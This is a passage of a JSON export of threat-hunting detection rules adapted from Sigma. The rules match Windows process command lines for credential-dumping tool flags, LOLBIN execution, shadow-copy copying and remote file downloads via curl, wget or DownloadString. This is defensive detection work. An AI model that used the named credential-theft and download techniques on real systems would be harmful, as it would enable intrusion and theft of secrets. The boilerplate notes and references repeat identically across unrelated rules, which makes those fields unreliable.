tgt.process.cmdline contains \"-kalypsomedia\" or tgt.process.cmdline contains \"-keepass\" or tgt.process.cmdline contains \"-keepassconfig\" or tgt.process.cmdline contains \"-lsa_secrets\" or tgt.process.cmdline contains \"-mavenrepositories\" or tgt.process.cmdline contains \"-memory_dump\" or tgt.process.cmdline contains \"-Mozilla\" or tgt.process.cmdline contains \"-mRemoteNG\" or tgt.process.cmdline contains \"-mscache\" or tgt.process.cmdline contains \"-opensshforwindows\" or tgt.process.cmdline contains \"-openvpn\" or tgt.process.cmdline contains \"-outlook\" or tgt.process.cmdline contains \"-pidgin\" or tgt.process.cmdline contains \"-postgresql\" or tgt.process.cmdline contains \"-psi-im\" or tgt.process.cmdline contains \"-puttycm\" or tgt.process.cmdline contains \"-pypykatz\" or tgt.process.cmdline contains \"-Rclone\" or tgt.process.cmdline contains \"-rdpmanager\" or tgt.process.cmdline contains \"-robomongo\" or tgt.process.cmdline contains \"-roguestale\" or tgt.process.cmdline contains \"-skype\" or tgt.process.cmdline contains \"-SQLDeveloper\" or tgt.process.cmdline contains \"-squirrel\" or tgt.process.cmdline contains \"-tortoise\" or tgt.process.cmdline contains \"-turba\" or tgt.process.cmdline contains \"-UCBrowser\" or tgt.process.cmdline contains \"-unattended\" or tgt.process.cmdline contains \"-vault\" or tgt.process.cmdline contains \"-vaultfiles\" or tgt.process.cmdline contains \"-vnc\" or tgt.process.cmdline contains \"-windows\" or tgt.process.cmdline contains \"-winscp\" or tgt.process.cmdline contains \"-wsl\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1195
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Use of Pcalua For Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\pcalua.exe\" and tgt.process.cmdline contains \" -a\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1196
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes of Wscript/Cscript. These include processes such as rundll32 with uncommon exports or PowerShell spawning rundll32 or regsvr32.\nMalware such as Pikabot and Qakbot were seen using similar techniques as well as many others.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Cscript/Wscript Potentially Suspicious Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\wscript.exe\" or src.process.image.path contains \"\\cscript.exe\") and (tgt.process.image.path contains \"\\rundll32.exe\" or ((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and ((tgt.process.cmdline contains \"mshta\" and tgt.process.cmdline contains \"http\") or (tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"msiexec\")))) and (not (tgt.process.image.path contains \"\\rundll32.exe\" and (tgt.process.cmdline contains \"UpdatePerUserSystemParameters\" or tgt.process.cmdline contains \"PrintUIEntry\" or tgt.process.cmdline contains \"ClearMyTracksByProcess\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1197
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an interactive AT job, which may be used as a form of privilege escalation.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Interactive AT Job",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\at.exe\" and tgt.process.cmdline contains \"interactive\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1198
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of SharpWSUS or WSUSpendu, utilities that allow for lateral movement through WSUS.\nWindows Server Update Services (WSUS) is a critical component of Windows systems and is frequently configured in a way that allows an attacker to circumvent internal networking limitations.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1210"
            ],
            "name": "HackTool - SharpWSUS/WSUSpendu Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -Inject \" and (tgt.process.cmdline contains \" -PayloadArgs \" or tgt.process.cmdline contains \" -PayloadFile \")) or ((tgt.process.cmdline contains \" approve \" or tgt.process.cmdline contains \" create \" or tgt.process.cmdline contains \" check \" or tgt.process.cmdline contains \" delete \") and (tgt.process.cmdline contains \" /payload:\" or tgt.process.cmdline contains \" /payload=\" or tgt.process.cmdline contains \" /updateid:\" or tgt.process.cmdline contains \" /updateid=\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1199
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1588"
            ],
            "name": "Potential Execution of Sysinternals Tools",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -accepteula\" or tgt.process.cmdline contains \" /accepteula\" or tgt.process.cmdline contains \" \u2013accepteula\" or tgt.process.cmdline contains \" \u2014accepteula\" or tgt.process.cmdline contains \" \u2015accepteula\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1200
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the desktopimgdownldr utility being used to download a remote file. An adversary may use desktopimgdownldr to download arbitrary files as an alternative to certutil.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Remote File Download Via Desktopimgdownldr Utility",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\desktopimgdownldr.exe\" and src.process.image.path contains \"\\desktopimgdownldr.exe\" and tgt.process.cmdline contains \"/lockscreenurl:http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1201
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Use of reg to get MachineGuid information",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1082"
            ],
            "name": "Suspicious Query of MachineGUID",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \"SOFTWARE\\Microsoft\\Cryptography\" and tgt.process.cmdline contains \"/v \" and tgt.process.cmdline contains \"MachineGuid\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1202
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the builtin \"copy\" command that targets a shadow copy (sometimes used to copy registry hives that are in use)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1490"
            ],
            "name": "Copy From VolumeShadowCopy Via Cmd.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"copy \" and tgt.process.cmdline contains \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1203
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to Internet Explorer's (IE / Windows Internet properties) ZoneMap configuration of the \"HTTP\" and \"HTTPS\" protocols to point to the \"My Computer\" zone. This allows downloaded files from the Internet to be granted the same level of trust as files stored locally.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "IE ZoneMap Setting Downgraded To MyComputer Zone For HTTP Protocols Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" and tgt.process.cmdline contains \"http\" and tgt.process.cmdline contains \" 0\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1204
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1133"
            ],
            "name": "Unusual Child Process of dns.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\dns.exe\" and (not tgt.process.image.path contains \"\\conhost.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1205
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1059",
                "t1218"
            ],
            "name": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\mshta.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\" or src.process.image.path contains \"\\rundll32.exe\" or src.process.image.path contains \"\\cscript.exe\" or src.process.image.path contains \"\\wscript.exe\" or src.process.image.path contains \"\\wmiprvse.exe\" or src.process.image.path contains \"\\regsvr32.exe\") and (tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\nslookup.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\mshta.exe\")) and (not (tgt.process.image.path contains \"\\ccmcache\\\" or (src.process.cmdline contains \"\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\setup-scheduledtask.ps1\" or src.process.cmdline contains \"\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\set-selfhealing.ps1\" or src.process.cmdline contains \"\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\check-workspacehealth.ps1\" or src.process.cmdline contains \"\\nessus_\") or tgt.process.cmdline contains \"\\nessus_\" or (src.process.image.path contains \"\\mshta.exe\" and tgt.process.image.path contains \"\\mshta.exe\" and (src.process.cmdline contains \"C:\\MEM_Configmgr_\" and src.process.cmdline contains \"\\splash.hta\" and src.process.cmdline contains \"{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}\") and (tgt.process.cmdline contains \"C:\\MEM_Configmgr_\" and tgt.process.cmdline contains \"\\SMSSETUP\\BIN\\\" and tgt.process.cmdline contains \"\\autorun.hta\" and tgt.process.cmdline contains \"{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}\")))))) | columns tgt.process.cmdline,src.process.cmdline,tgt.process.image.path,tgt.process.image.path,src.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1206
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1059",
                "t1105"
            ],
            "name": "Command Line Execution with Suspicious URL and AppData Strings",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\cmd.exe\" and (tgt.process.cmdline contains \"http\" and tgt.process.cmdline contains \"://\" and tgt.process.cmdline contains \"%AppData%\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1207
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a ping command that uses a hex encoded IP address",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1140",
                "t1027"
            ],
            "name": "Ping Hex IP",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ping.exe\" and tgt.process.cmdline contains \"0x\")) | columns src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1208
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105",
                "t1608"
            ],
            "name": "Suspicious Download from Office Domain",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\wget.exe\") or (tgt.process.cmdline contains \"Invoke-WebRequest\" or tgt.process.cmdline contains \"iwr \" or tgt.process.cmdline contains \"curl \" or tgt.process.cmdline contains \"wget \" or tgt.process.cmdline contains \"Start-BitsTransfer\" or tgt.process.cmdline contains \".DownloadFile(\" or tgt.process.cmdline contains \".DownloadString(\")) and (tgt.process.cmdline contains \"https://attachment.outlook.live.net/owa/\" or tgt.process.cmdline contains \"https://onenoteonlinesync.onenote.com/onenoteonlinesync/\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1209
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Taskmgr as LOCAL_SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\") and tgt.process.image.path contains \"\\taskmgr.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1210
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of a browser process with a URL argument pointing to a file with a potentially interesting extension. This can be abused to download arbitrary files or to hide from the user for example by launching the browser in a minimized state.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "File Download From Browser Process Via Inline URL",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
